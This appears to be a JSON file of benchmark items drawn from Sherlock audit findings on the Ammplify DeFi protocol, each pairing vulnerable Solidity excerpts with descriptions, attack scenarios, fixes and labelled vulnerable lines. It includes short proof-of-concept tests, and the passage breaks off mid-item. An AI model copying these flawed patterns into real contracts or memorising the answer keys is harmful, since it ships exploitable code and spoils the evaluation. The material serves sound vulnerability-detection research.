[
    {
        "id": "gs_sherlock_ammplify_M23",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-23",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "standards_violation",
        "difficulty_tier": 1,
        "context_level": "single_file",
        "finding_title": "The protocol doesn't support weird tokens like Tether Gold (that return false on every operation)",
        "finding_description": "The protocol uses the TransferHelper.safeTransferFrom(token, _currentTokenRequester, msg.sender, uint256(change)) for its token transfers. But this does not work if the token returns false for all the operations. Tokens like Tether gold will cause the transfer to always revert. Thus such tokens are not supported by the protocol.",
        "attack_scenario": "There is no attack path for this. However, the protocol claims to support tokens that it cannot support, leading to integration failures.",
        "fix_description": "No mitigation provided in the report.",
        "primary_file": {
            "path": "Ammplify/src/integrations/NFTManager.sol",
            "content": "            if (change > 0) {  \r\n                // Pull tokens from the original caller and send to MAKER_FACET  \r\n                TransferHelper.safeTransferFrom(token, _currentTokenRequester, msg.sender, uint256(change));  \r\n            } else if (change < 0) {  \r\n                // Send tokens from our balance to MAKER_FACET (for fee collection, etc.)  \r\n                TransferHelper.safeTransfer(token, msg.sender, uint256(-change));  \r\n            }  \r\n  \r\n            // After primary transfer, sweep any dust the contract may still hold for this token  \r\n            uint256 residual = IERC20(token).balanceOf(address(this));  \r\n            if (residual > 0) {  \r\n                TransferHelper.safeTransfer(token, msg.sender, residual);  \r\n            }  ",
            "vulnerable_lines": [
                570,
                571,
                572,
                573,
                574,
                575,
                576,
                577,
                578,
                579,
                580,
                581,
                582
            ],
            "vulnerable_functions": [
                "transfer",
                "safeTransferFrom"
            ]
        },
        "context_files": [],
        "call_flow": "",
        "context_hint": "Token compatibility issue - tokens that return false instead of reverting are not handled correctly by the TransferHelper library.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M22",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-22",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "integer_overflow",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "Utilization Ratio Overflow Due to Incorrect uint64 Cast",
        "finding_description": "The chargeTrueFeeRate() and getLeftRightWeights() functions in walkers/Fee.sol incorrectly assume that calculateRateX64() requires a uint64 input. In reality, the function accepts a uint128. Because of this wrong assumption, utilization ratios are downcast from uint256 to uint64, which can silently overflow. At 100% utilization (totalTLiq == totalMLiq), the expression evaluates to 1 << 64, which cannot fit in uint64 and silently wraps to 0. As a result, instead of passing a correct utilization ratio, the function incorrectly sends 0 to calculateRateX64(), leading to fees being computed as if utilization was 0%.",
        "attack_scenario": "1. A liquidity pool reaches 100% utilization.\n2. Utilization ratio (totalTLiq << 64) / totalMLiq evaluates to 1 << 64. The cast to uint64 wraps this to 0.\n3. calculateRateX64() receives a utilization input of 0 instead of full utilization.\n4. Takers are charged incorrect (much lower) fees, and fee splits are misallocated.\n\nTakers at 100% utilization are undercharged and pay as if utilization was 0%. Protocol Makers lose fees during the highest utilization periods.",
        "fix_description": "Do not cast the utilX64 result into uint64. Compute it in uint256, then safely cast to uint128:\n\nuint256 rawUtilX64 = FullMath.mulDiv(totalTLiq, 1 << 64, totalMLiq);\nuint128 utilX64 = uint128(rawUtilX64);\nuint128 ratePerYearX64 = data.fees.rateConfig.calculateRateX64(utilX64);",
        "primary_file": {
            "path": "Ammplify/src/walkers/Fee.sol",
            "content": "uint64 utilX64 = uint64((totalTLiq << 64) / totalMLiq);  function calculateRateX64( SmoothRateCurveConfig memory self, uint128 utilX64)  function setUp() public {  \r\n        _newDiamond();  \r\n        //////////  \r\n        adminFacet.submitRights(address(this), AmmplifyAdminRights.TAKER, true);  \r\n        vm.warp(block.timestamp + 3 days);  \r\n        adminFacet.acceptRights();  \r\n        /////////////////////  \r\n  \r\n        (, address _pool, address _token0, address _token1) = setUpPool();  \r\n  \r\n        token0 = MockERC20(_token0);  \r\n        token1 = MockERC20(_token1);  \r\n        pool = UniswapV3Pool(_pool);  \r\n  \r\n        // Set up recipient and basic test parameters  \r\n        recipient = address(this);  \r\n        poolAddr = _pool;  \r\n        lowTick = -600;  \r\n        highTick = 600;  \r\n        liquidity = 100e18;  \r\n        //addPoolLiq(0, lowTick, highTick, liquidity);  \r\n        minSqrtPriceX96 = MIN_SQRT_RATIO;  \r\n        maxSqrtPriceX96 = MAX_SQRT_RATIO;  \r\n  \r\n        poolInfo = viewFacet.getPoolInfo(poolAddr);  \r\n  \r\n        // Fund this contract for testing  \r\n        _fundAccount(address(this));  \r\n        ////////////////////////////////////    \r\n        vaultIndices = [0, 1];  \r\n        sqrtPriceLimitsX96 = [MIN_SQRT_RATIO, MAX_SQRT_RATIO];  \r\n        freezeSqrtPriceX96 = 3 << 95; // Above range, 1.5 = sqrt(price)  \r\n        // Create vaults for the pool tokens  \r\n        _createPoolVaults(poolAddr);  \r\n}  \r\n  \r\nfunction test_PoC() public {  \r\n        bytes memory rftData = \"\";  \r\n        int24  lowTick1 = -600;  \r\n        int24  highTick1 = 0;  \r\n        uint128 liquidity1 = 100e18;  \r\n        uint256 assetId1 = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            lowTick1,  \r\n            highTick1,  \r\n            liquidity1,  \r\n            false, // non-compounding  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n        //////////////////////////////////  \r\n        int24  lowTick2 = 0;  \r\n        int24  highTick2 = 600;  \r\n        uint128 liquidity2 = 100e18;  \r\n        uint256 assetId2 = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            lowTick2,  \r\n            highTick2,  \r\n            liquidity2,  \r\n            false, // non-compounding  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n        ///////////////////////////////////  \r\n        // Taker1: usage ratio 100%   \r\n        ticks = [-600,int24(0)];   \r\n        uint128 taker1Liquidity = 100e18;  \r\n        uint256 assetId3 = takerFacet.newTaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            ticks,  \r\n            taker1Liquidity,  \r\n            vaultIndices,  \r\n            sqrtPriceLimitsX96,  \r\n            freezeSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n        //////////////////////////////////  \r\n        // Taker2: usage ratio 50%   \r\n        ticks = [int24(0), 600];   \r\n        uint128 taker2Liquidity = 50e18;  \r\n        uint256 assetId4 = takerFacet.newTaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            ticks,  \r\n            taker2Liquidity,  \r\n            vaultIndices,  \r\n            sqrtPriceLimitsX96,  \r\n            freezeSqrtPriceX96,  \r\n            rftData  \r\n        );          \r\n        // time pass then we calculate the takers fees and balances    \r\n        vm.warp(block.timestamp + 60 seconds);  \r\n        (int256 taker1QueriedNetBalance0, int256 taker1QueriedNetBalance1, uint256 taker1QueriedFees0, uint256 taker1QueriedFees1) =   \r\n                viewFacet.queryAssetBalances(assetId3);  \r\n        console2.log(\"Taker queriedBalance0 :\", taker1QueriedNetBalance0);  \r\n        console2.log(\"Taker queriedBalance1 :\", taker1QueriedNetBalance1);  \r\n        console2.log(\"Taker fees : 0 -- 1 :\", taker1QueriedFees0, taker1QueriedFees1);  \r\n        ///////////      \r\n        (int256 taker2QueriedNetBalance0,  int256 taker2QueriedNetBalance1,  uint256 taker2QueriedFees0,  uint256 taker2QueriedFees1) =   \r\n                viewFacet.queryAssetBalances(assetId4);  \r\n        console2.log(\"Taker queriedBalance0 :\", taker2QueriedNetBalance0);  \r\n        console2.log(\"Taker queriedBalance1 :\", taker2QueriedNetBalance1);  \r\n        console2.log(\"Taker fees : 0 -- 1 :\", taker2QueriedFees0, taker2QueriedFees1);  \r\n          \r\n        // Taker2 with usage ration of 50% will pay higher fees that Taker1 with usage ratio  of 100%   \r\n        assertGe(taker2QueriedFees0,taker1QueriedFees0);  \r\n        assertGe(taker2QueriedFees1,taker1QueriedFees1);  \r\n    }  ",
            "vulnerable_lines": [
                347,
                398
            ],
            "vulnerable_functions": [
                "chargeTrueFeeRate",
                "getLeftRightWeights"
            ]
        },
        "context_files": [],
        "call_flow": "Fee calculation -> incorrect uint64 cast -> overflow to 0 -> wrong fee charged",
        "context_hint": "Integer overflow in type casting - when utilization is 100%, the value 1<<64 cannot fit in uint64 and wraps to 0, causing completely wrong fee calculations.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M21",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-21",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 1,
        "context_level": "single_file",
        "finding_title": "adjustMaker ignores recipient parameter when removing liquidity",
        "finding_description": "The adjustMaker function takes a recipient parameter. The NatSpec says this should define who gets the tokens when removing liquidity. But in the code, the function always sends tokens to msg.sender, even when removing liquidity. This means the recipient parameter is not used at all. The implementation always uses msg.sender for settlement, regardless of whether liquidity is being added or removed.",
        "attack_scenario": "1. Alice opens a maker position.\n2. Alice calls adjustMaker with recipient = Bob.\n3. Liquidity is removed.\n4. Tokens are sent to Alice (msg.sender) instead of Bob.\n5. The system relying on recipient for accounting or further operations now behaves incorrectly.\n\nThis breaks the function's documented behavior and can cause accounting problems or failed integrations.",
        "fix_description": "Update the function so that:\n- When adding liquidity → keep using msg.sender (since they are depositing)\n- When removing liquidity → use recipient (so the tokens go where the caller specified)",
        "primary_file": {
            "path": "Ammplify/src/facets/Maker.sol",
            "content": "RFTLib.settle(msg.sender, tokens, balances, rftData);  ",
            "vulnerable_lines": [
                89
            ],
            "vulnerable_functions": [
                "adjustMaker"
            ]
        },
        "context_files": [],
        "call_flow": "adjustMaker(recipient) -> RFTLib.settle(msg.sender) -> tokens sent to wrong address",
        "context_hint": "Parameter ignored - the recipient parameter is specified but never used, causing funds to always go to msg.sender instead of the intended recipient.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M20",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-20",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "Makers can permanently lock JIT penalty revenue from the protocol treasury",
        "finding_description": "Missing accounting and withdrawal for JIT penalties will cause a permanent lockup of protocol revenue for the protocol treasury as makers who withdraw shortly after adding liquidity will incur a penalty that remains as idle ERC20 on the contract with no path to claim or route it. The penalty calculation only scales down the user's redemption amounts and returns the reduced values; it does not emit, credit, or transfer the penalty to any accounting bucket or address. Settlement uses RFTLib.settle, which sends/receives the specified deltas with the counterparty. Since the deltas already include the penalty reduction, nothing explicitly transfers the penalty to a treasury; it simply remains in the diamond contract's balance.",
        "attack_scenario": "1. Maker adds liquidity and withdraws shortly after\n2. JIT penalty is applied, reducing the amounts returned to the maker\n3. The penalty difference stays in the contract as idle token balance\n4. No admin/treasury function exists to sweep or withdraw these balances\n5. Penalty funds are permanently locked in the contract",
        "fix_description": "Route penalties to a configured treasury address at the time of application. Add a configurable treasury address in the FeeStore struct and transfer the penalty amounts to this address when applying JIT penalties.",
        "primary_file": {
            "path": "Ammplify/src/facets/Maker.sol",
            "content": "// src/facets/Maker.sol (excerpt from adjustMaker)  \r\n} else {  \r\n    require(data.yBalance < 0);  \r\n    PoolWalker.settle(pInfo, asset.lowTick, asset.highTick, data);  \r\n    uint256 removedX = uint256(-data.xBalance);  \r\n    uint256 removedY = uint256(-data.yBalance);  \r\n    (removedX, removedY) = FeeLib.applyJITPenalties(asset, removedX, removedY);  \r\n    balances[0] = -int256(removedX);  \r\n    balances[1] = -int256(removedY);  \r\n    RFTLib.settle(msg.sender, tokens, balances, rftData);  \r\n}  // src/facets/Maker.sol (excerpt from removeMaker)  \r\nremovedX = uint256(-data.xBalance);  \r\nremovedY = uint256(-data.yBalance);  \r\n(removedX, removedY) = FeeLib.applyJITPenalties(asset, removedX, removedY);  \r\n// ...  \r\nbalances[0] = -int256(removedX);  \r\nbalances[1] = -int256(removedY);  \r\nRFTLib.settle(recipient, tokens, balances, rftData);  // src/Fee.sol (excerpt)  \r\nfunction applyJITPenalties(  \r\n    Asset storage asset,  \r\n    uint256 xBalance,  \r\n    uint256 yBalance  \r\n) internal view returns (uint256 xBalanceOut, uint256 yBalanceOut) {  \r\n    FeeStore storage store = Store.fees();  \r\n    uint128 duration = uint128(block.timestamp) - asset.timestamp;  \r\n    if (duration >= store.jitLifetime) {  \r\n        return (xBalance, yBalance);  \r\n    }  \r\n    uint256 penaltyX64 = store.jitPenaltyX64;  \r\n    xBalanceOut = FullMath.mulX64(xBalance, penaltyX64, true);  \r\n    yBalanceOut = FullMath.mulX64(yBalance, penaltyX64, true);  \r\n}  // lib/Commons/src/Util/RFT.sol (excerpt)  \r\nif (change < 0) {  \r\n    TransferHelper.safeTransfer(token, payer, uint256(-change));  \r\n}  \r\nif (change > 0 && !isRFTPayer) {  \r\n    TransferHelper.safeTransferFrom(token, payer, address(this), uint256(change));  \r\n}  ",
            "vulnerable_lines": [
                117
            ],
            "vulnerable_functions": [
                "adjustMaker",
                "removeMaker"
            ]
        },
        "context_files": [
            {
                "path": "Ammplify/src/Fee.sol",
                "content": "// Content would need to be fetched from GitHub repo",
                "relevance": "Contains the applyJITPenalties function that reduces user balances but doesn't route the penalty to any recipient"
            }
        ],
        "call_flow": "adjustMaker/removeMaker -> FeeLib.applyJITPenalties -> amounts reduced -> RFTLib.settle with reduced amounts -> penalty stays in contract",
        "context_hint": "Penalty funds are calculated and deducted from user withdrawals but never credited to treasury or any beneficiary, causing them to accumulate as idle balances in the contract with no recovery mechanism.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M19",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-19",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "ViewFacet.queryAssetBalances doesn't include uncollected uniswap fees for compounded maker position",
        "finding_description": "When ViewFacet.queryAssetBalances calculates the earnings for compounded maker, it ignores the uncollected uniswap fees. When the actual compounded maker asset is removed, the uncollected uniswap fees are added to node.fees.xCFees and node.fees.yCFees and compounded as additional liquidity. If liquidity is not increased (fees below compound threshold), then these fees are simply added to xCfees/yCFees. Either way, the value of these uniswap uncollected fees is added to maker earnings, which doesn't happen for ViewFacet.",
        "attack_scenario": "Any time someone tries to query assets via ViewFacet, the amount for compounded maker earnings is under-reported. User can fail to account for these fees, breaking any further logic it has and possibly losing the difference as unrecoverable asset. The amount under-reported can often be more than 0.01% depending on the frequency of fees collection.",
        "fix_description": "Include uncollected uniswap fees in the calculation:\n\ndata.earningsX += FullMath.mulDiv(fee0DiffX128 + node.fees.xCFees, aNode.sliq, node.liq.shares);\ndata.earningsY += FullMath.mulDiv(fee1DiffX128 + node.fees.yCFees, aNode.sliq, node.liq.shares);",
        "primary_file": {
            "path": "Ammplify/src/walkers/View.sol",
            "content": "        uint256 fee0DiffX128 = newFeeGrowthInside0X128 - node.liq.feeGrowthInside0X128;  \r\n        uint256 fee1DiffX128 = newFeeGrowthInside1X128 - node.liq.feeGrowthInside1X128;  \r\n        if (data.liq.liqType == LiqType.MAKER) {  \r\n            // We just claim our shares.  \r\n            // If the sliq and shares are zero, you should fail anyways.  \r\n            // @audit-issue compounded maker should also include fee0DiffX128/fee1DiffX128 here  \r\n            data.earningsX += FullMath.mulDiv(node.fees.xCFees, aNode.sliq, node.liq.shares);  \r\n            data.earningsY += FullMath.mulDiv(node.fees.yCFees, aNode.sliq, node.liq.shares);  \r\n        } else if (data.liq.liqType == LiqType.MAKER_NC) {  \r\n            data.earningsX += FullMath.mulX128(  \r\n                aNode.sliq,  \r\n                fee0DiffX128 + node.fees.makerXFeesPerLiqX128 - aNode.fee0CheckX128,  \r\n                false  \r\n            );  \r\n            data.earningsY += FullMath.mulX128(  \r\n                aNode.sliq,  \r\n                fee1DiffX128 + node.fees.makerYFeesPerLiqX128 - aNode.fee1CheckX128,  \r\n                false  \r\n            );  \r\n        } else {  ",
            "vulnerable_lines": [
                335,
                336
            ],
            "vulnerable_functions": [
                "queryAssetBalances"
            ]
        },
        "context_files": [],
        "call_flow": "queryAssetBalances -> compounded maker earnings calculation -> uncollected fees omitted -> incorrect value returned",
        "context_hint": "View function returns incomplete earnings data by excluding uncollected Uniswap fees that would be included when actually withdrawing the position.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M18",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-18",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "integer_overflow",
        "difficulty_tier": 3,
        "context_level": "cross_contract",
        "finding_title": "Shift-Overflow in getEquivalentLiq Inflates LP Shares",
        "finding_description": "PoolLib.getEquivalentLiq computes the liquidity-equivalent value of token balances using left shifts prior to division. The term (lyX128 << 96) / sqrtPriceX96 can overflow 256 bits before division, silently truncating high bits and shrinking the denominator. This inflates equivLiq, corrupts share/compounding math, and causes unfair value reallocation between LPs. For wide ranges, lyX128 can be on the order of 2^192 (with liq = X128), so (lyX128 << 96) can exceed 2^256 and wrap, reducing liqValueX128. That inflates equivLiq and misprices compounding liquidity and shares.",
        "attack_scenario": "1. Set up a pool and deposit Maker liquidity so a high-level (wide-range) node accumulates compounding fees.\n2. Trigger a Maker modify on that node so Liq.modify calls PoolLib.getEquivalentLiq with a wide range.\n3. For wide ranges, lyX128 becomes large (~2^192). The expression (lyX128 << 96) / sqrtPriceX96 overflows 256 bits before the division and truncates high bits, reducing liqValueX128.\n4. Reduced liqValueX128 inflates equivLiq, which then inflates compoundingLiq and miscomputes shares. The caller receives an outsized share of future fees/principal; other LPs are diluted.",
        "fix_description": "Replace shift-before-division with precise 512-bit math:\n- FullMath.mulDiv(lyX128, 1 << 96, sqrtPriceX96) instead of (lyX128 << 96) / sqrtPriceX96\n- Likewise FullMath.mulDiv(y, 1 << 96, sqrtPriceX96) instead of (y << 96) / sqrtPriceX96",
        "primary_file": {
            "path": "Ammplify/src/Pool.sol",
            "content": "function getEquivalentLiq(  \r\n    int24 lowTick,  \r\n    int24 highTick,  \r\n    uint256 x,  \r\n    uint256 y,  \r\n    uint160 sqrtPriceX96,  \r\n    bool roundUp  \r\n) internal pure returns (uint128 equivLiq) {  \r\n    (uint256 lxX128, uint256 lyX128) = getAmounts(sqrtPriceX96, lowTick, highTick, X128, roundUp);  \r\n    uint256 liqValueX128 = (FullMath.mulX64(lxX128, sqrtPriceX96, false) >> 32)  \r\n        + (lyX128 << 96) / sqrtPriceX96; // vulnerable: left shift can overflow 256-bit before division → truncated denominator  \r\n    uint256 myValue = FullMath.mulX128(x, uint256(sqrtPriceX96) << 32, false)  \r\n        + (y << 96) / sqrtPriceX96; // similar pattern; shift before div risks overflow  \r\n    // ...  \r\n}  // For adding liquidity, we need to consider existing fees  \r\n// and what amount of equivalent liq they're worth.  \r\nuint128 equivLiq = PoolLib.getEquivalentLiq(  \r\n    iter.lowTick,  \r\n    iter.highTick,  \r\n    node.fees.xCFees,  \r\n    node.fees.yCFees,  \r\n    data.sqrtPriceX96,  \r\n    true  \r\n);  \r\n// reachable: inflated equivLiq corrupts compoundingLiq and subsequent share math  \r\ncompoundingLiq = node.liq.mLiq - node.liq.ncLiq + equivLiq;  \r\ncurrentLiq = uint128(FullMath.mulDiv(compoundingLiq, sliq, node.liq.shares));  ",
            "vulnerable_lines": [
                241,
                242,
                243,
                244,
                245,
                246,
                247,
                248,
                249,
                250,
                251,
                252,
                253,
                254,
                255,
                256,
                257,
                258,
                259
            ],
            "vulnerable_functions": [
                "getEquivalentLiq"
            ]
        },
        "context_files": [
            {
                "path": "Ammplify/src/walkers/Liq.sol",
                "content": "// Content would need to be fetched from GitHub repo",
                "relevance": "Calls getEquivalentLiq for compounding calculations, where the inflated value corrupts share math"
            }
        ],
        "call_flow": "Maker modify -> Liq.modify -> PoolLib.getEquivalentLiq -> overflow in shift -> inflated equivLiq -> corrupted compoundingLiq -> wrong shares minted",
        "context_hint": "Arithmetic overflow in bit shift operations before division causes values to wrap around, leading to completely wrong liquidity calculations that favor attackers and dilute honest LPs.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M17",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-17",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "Maker.adjustMaker always reverts when trying to reduce maker liquidity while current price is below position range",
        "finding_description": "When Maker.adjustMaker is called, it checks for the calculated amounts of 2 tokens to give to / take from the user to be of the same sign. In the case of x < 0, y == 0 (which corresponds to reducing liquidity when current price is below position range), the transaction incorrectly reverts. User will be unable to reduce position in such situation. If the price stays below the range for extended time, user will not be able to get his funds for extended time.",
        "attack_scenario": "1. User creates a maker position with price range above current price\n2. Current pool price is below the position range (all liquidity is in token X)\n3. User tries to reduce maker liquidity via adjustMaker\n4. Function calculates xBalance < 0, yBalance == 0\n5. Function incorrectly reverts due to require(data.yBalance < 0)\n6. User cannot reduce position and funds are temporarily stuck",
        "fix_description": "Handle case of x < 0, y == 0 correctly by changing the require statement:\n\nrequire(data.yBalance <= 0);",
        "primary_file": {
            "path": "Ammplify/src/facets/Maker.sol",
            "content": "        if (data.xBalance == 0 && data.yBalance == 0) {  \r\n            revert DeMinimusMaker(targetLiq);  \r\n        } else if (data.xBalance > 0 || (data.xBalance == 0 && data.yBalance > 0)) {  \r\n            // Both should go up together.  \r\n            require(data.yBalance >= 0);  \r\n            balances[0] = data.xBalance;  \r\n            balances[1] = data.yBalance;  \r\n            RFTLib.settle(msg.sender, tokens, balances, rftData);  \r\n            PoolWalker.settle(pInfo, asset.lowTick, asset.highTick, data);  \r\n        } else {  \r\n            require(data.yBalance < 0);      // test the case when maker reduces position and should be given xBalance < 0, yBalance == 0  \r\n    // (reduce when current price is below range)  \r\n    function testAdjustMakerReduceRevert() public {  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        // current price below the range we'll work at  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(700));  \r\n  \r\n        // Create maker  \r\n        uint256 makerAssetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            720,  \r\n            960,  \r\n            300e18,  \r\n            true,  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // try to reduce maker  \r\n        makerFacet.adjustMaker(recipient, makerAssetId, 200e18, minSqrtPriceX96, maxSqrtPriceX96, rftData);  \r\n    }      │   │   ├─ [0] console::log(\"adjustMaker: data.xBalance = \", -1150595527261723251 [-1.15e18]) [staticcall]  \r\n    │   │   │   └─ ← [Stop]  \r\n    │   │   ├─ [0] console::log(\"adjustMaker: data.yBalance = \", 0) [staticcall]  \r\n    │   │   │   └─ ← [Stop]  \r\n    │   │   └─ ← [Revert] EvmError: Revert  \r\n    │   └─ ← [Revert] EvmError: Revert  \r\n    └─ ← [Revert] EvmError: Revert  ",
            "vulnerable_lines": [
                72,
                73,
                74,
                75,
                76,
                77,
                78,
                79,
                80,
                81,
                82
            ],
            "vulnerable_functions": [
                "adjustMaker"
            ]
        },
        "context_files": [],
        "call_flow": "adjustMaker -> calculate balances -> xBalance < 0, yBalance == 0 -> require(yBalance < 0) fails -> revert",
        "context_hint": "Edge case in sign checking logic - when price is below range and liquidity is reduced, only token X is involved (yBalance = 0), but the code incorrectly requires yBalance < 0, causing legitimate operations to revert.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M16",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-16",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "standards_violation",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "UniV3Decomposer will always revert due to incorrect RFTPayer support and lack of token approvals to MakerFacet",
        "finding_description": "UniV3Decomposer takes Uniswap v3 NFT position and converts it into Ammplify Maker position. While UniV3Decomposer inherits from RFTPayer, it fails to conform to ERC165, because it doesn't have the correct supportsInterface function. It is not enough to just inherit from RFTPayer, because this only sets up interfaces storage in the constructor, but doesn't actually add the supportsInterface function. As a result, when Maker.newMaker is called, it doesn't recognize UniV3Decomposer as correct RFTPayer and falls back to simply transferring tokens from UniV3Decomposer using transferFrom. The issue is that UniV3Decomposer doesn't approve asset tokens to MakerFacet, thus transferFrom will always revert.",
        "attack_scenario": "1. User calls UniV3Decomposer.decompose with their Uniswap V3 NFT\n2. NFT is burned, tokens received by decomposer\n3. Decomposer calls Maker.newMaker\n4. MakerFacet checks if decomposer supports RFTPayer interface\n5. Check fails because supportsInterface is missing\n6. MakerFacet tries transferFrom without approval\n7. Transaction reverts\n\nCore functionality of decomposing Uniswap V3 NFT positions never works, rendering the composer contract useless.",
        "fix_description": "Add supportsInterface function similar to NFTManager:\n\nfunction supportsInterface(bytes4 interfaceId) public view override returns (bool) {\n    return super.supportsInterface(interfaceId) || Auto165Lib.contains(interfaceId);\n}\n\nAdditionally, update MockERC20 contract with correct approvals usage and checks.",
        "primary_file": {
            "path": "Ammplify/src/integrations/UniV3Decomposer.sol",
            "content": "NA",
            "vulnerable_lines": [
                22
            ],
            "vulnerable_functions": [
                "decompose"
            ]
        },
        "context_files": [],
        "call_flow": "decompose -> Maker.newMaker -> ERC165 check fails -> transferFrom without approval -> revert",
        "context_hint": "ERC165 interface support not properly implemented - contract inherits from RFTPayer but doesn't expose the supportsInterface function, causing interface detection to fail and leading to unapproved token transfers.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M15",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-15",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "rounding_error",
        "difficulty_tier": 3,
        "context_level": "single_file",
        "finding_title": "Some legitimate UniV3Decomposer decompose attempts will always revert due to incorrect liquidity offset calculation",
        "finding_description": "UniV3Decomposer takes Uniswap v3 NFT position and converts it into Ammplify Maker position by burning NFT position and minting Maker position with slightly reduced liquidity. The formula used to calculate liquidity offset is: liquidity offset = Q96 * 42 / (sqrtPrice(high) - sqrtPrice(low)). The issue is that this formula derives the liquidity offset only from amount1 calculation of the [a..b] range, ignoring the effect on amount0. In some cases there will be enough of asset1, but not enough of asset0 to mint Ammplify Maker liquidity. Moreover, liquidity offset for each segment minted in Ammplify Maker will be higher than liquidity offset for the [a..b] range, so liquidity offset of the [a..b] range can't be reliably used to estimate max liquidity offset of sub-segments.",
        "attack_scenario": "Example with specific ticks:\n- TickLower = 70020\n- TickUpper = 70080\n- Uniswap V3 NFT: token0 = 1e18, Liquidity = 11064726116504895354478\n- When burned, decomposer receives 999999999999999999 token0 (rounding down)\n- liquidityOffset = 421\n- Maker.newMaker called with liquidity = 11064726116504895354057\n- Required token0 payment = 1000000000000000000 (1 more than received)\n- Transaction reverts due to insufficient funds\n\nThe correct liquidity offset should be 11065, not 421.",
        "fix_description": "Calculate Liquidity offset as:\n- L0 = ceil(ceil(42 * a * b / (b - a)) / Q96)\n- L1 = ceil(42 * Q96 / (b - a))\n- Liquidity Offset = max(L0, L1)\n\nRecommended to choose a = sqrtPrice(upperTick - tickSpacing) to account for worst case segment.",
        "primary_file": {
            "path": "Ammplify/src/integrations/UniV3Decomposer.sol",
